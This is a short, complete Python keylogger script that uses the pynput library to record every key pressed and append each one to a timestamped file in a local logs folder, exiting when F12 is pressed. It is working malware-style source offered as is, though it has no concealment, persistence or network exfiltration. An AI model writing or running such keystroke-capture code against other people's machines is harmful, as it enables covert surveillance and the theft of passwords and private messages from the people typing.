# Simple keylogger

import os
import sys
import time
from pynput import keyboard

if not os.path.exists("logs"):
    os.makedirs("logs")
date = time.strftime("log-%Y-%m-%d_%H-%M-%S")

# Given a key, writes it to a file
def on_key_press(key):
    try:
        file = open('logs/' + date + ".txt", 'a')
        file.write(key.char + "\n")
        file.close()
    except AttributeError:
        file = open('logs/' + date + ".txt", 'a')
        file.write('{0}\n'.format(key))
        file.close()
    except TypeError:
        file = open('logs/' + date + ".txt", 'a')
        file.write('Custom Key: {0}\n'.format(key))
        file.close()

    if key == keyboard.Key.f12:
        sys.exit()

with keyboard.Listener(on_press=on_key_press) as listener:
    listener.join()
